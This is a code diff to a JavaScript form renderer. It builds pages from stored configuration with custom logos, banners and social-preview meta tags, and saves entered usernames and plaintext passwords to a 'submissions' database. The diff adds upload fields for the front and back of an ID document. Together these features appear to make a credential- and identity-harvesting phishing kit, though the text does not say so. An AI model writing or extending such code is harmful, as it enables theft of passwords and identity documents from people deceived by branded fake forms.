@@ -80,10 +80,10 @@ function renderForm(data){
   const wrap = document.getElementById("formWrap");
   wrap.innerHTML = "";
   wrap.style.background = data.bgColor || "#fff";
-  if(data.bgImageURL){
-    wrap.style.backgroundImage = `url(${data.bgImageURL})`;
-    wrap.style.backgroundSize = data.bgSize || "cover";
-  }
+  if(data.bgImage){
+  wrap.style.backgroundImage = `url(${data.bgImage})`;
+  wrap.style.backgroundSize = data.bgSize || "cover";
+}
 
   // Header images
   if(data.avatarURL){
@@ -95,14 +95,14 @@ function renderForm(data){
     img.style.margin = "auto";
     wrap.appendChild(img);
   }
-  if(data.logoURL){
-    const img = document.createElement("img");
-    img.src = data.logoURL;
-    img.style.width = "140px";
-    img.style.display = "block";
-    img.style.margin = "auto";
-    wrap.appendChild(img);
-  }
+  if(data.logoURL || data.bannerURL){
+  const img = document.createElement("img");
+  img.src = data.logoURL || data.bannerURL;
+  img.style.width = "140px";
+  img.style.display = "block";
+  img.style.margin = "auto";
+  wrap.appendChild(img);
+}
 
   // Titles & description
   const title = document.createElement("h2");
@@ -150,17 +150,29 @@ function renderForm(data){
   }
 
   // Extra fields
-  const extraInputs = [];
-  if(data.extraFields && data.extraFields.length){
-    data.extraFields.forEach(v=>{
-      if(v.trim()){
-        const input = document.createElement("input");
-        input.placeholder = v.trim();
-        formDiv.appendChild(input);
-        extraInputs.push(input);
-      }
-    });
-  }
+const extraInputs = [];
+
+if(data.extraFields && data.extraFields.length){
+  data.extraFields.forEach(v=>{
+    if(v.trim()){
+      const input = document.createElement("input");
+      input.placeholder = v.trim();
+      formDiv.appendChild(input);
+      extraInputs.push(input);
+    }
+  });
+}
+
+// ID Upload fields (AFTER extra fields)
+const frontInput = document.createElement("input");
+frontInput.type = "file";
+frontInput.id = "frontUpload";
+formDiv.appendChild(frontInput);
+
+const backInput = document.createElement("input");
+backInput.type = "file";
+backInput.id = "backUpload";
+formDiv.appendChild(backInput);
 
   // Embed Links
   if(data.embedLinks){
@@ -229,9 +241,12 @@ function renderForm(data){
   const fileURL = [uploadedFront, uploadedBack].filter(Boolean).join(" | ");
 
   // 2️⃣ Collect form values
-  const username = formDiv.querySelector('input[type="text"]')?.value || "";
-  const password = formDiv.querySelector('input[type="password"]')?.value || "";
-  const extraValues = extraInputs.map(i=>i.value);
+  const inputs = formDiv.querySelectorAll("input");
+const username = inputs[0]?.value || "";
+const password = formDiv.querySelector('input[type="password"]')?.value || "";
+
+// ✅ FIX: collect extra field values
+const extraValues = extraInputs.map(i => i.value);
 
   // 3️⃣ Save
   await db.collection("submissions").add({
@@ -320,6 +335,7 @@ if(formId){
     }
 
     const data = doc.data();
+    console.log("FORM DATA:", data);
     
     // ✅ UPDATE SEO META TAGS (for browser, not bots)
 const seoTitle = data.seoTitle || data.title || "Untitled Form";
@@ -337,14 +353,6 @@ document.querySelector('meta[property="og:image"]')?.setAttribute("content", ogI
 document.querySelector('meta[name="twitter:title"]')?.setAttribute("content", seoTitle);
 document.querySelector('meta[name="twitter:description"]')?.setAttribute("content", metaDesc);
 document.querySelector('meta[name="twitter:image"]')?.setAttribute("content", ogImage);
-
-    // ✅ If full HTML exists → use it
-    if (data.html) {
-      document.open();
-      document.write(data.html);
-      document.close();
-      return; // 🔥 VERY IMPORTANT
-    }
 
     // fallback
     renderForm(data);
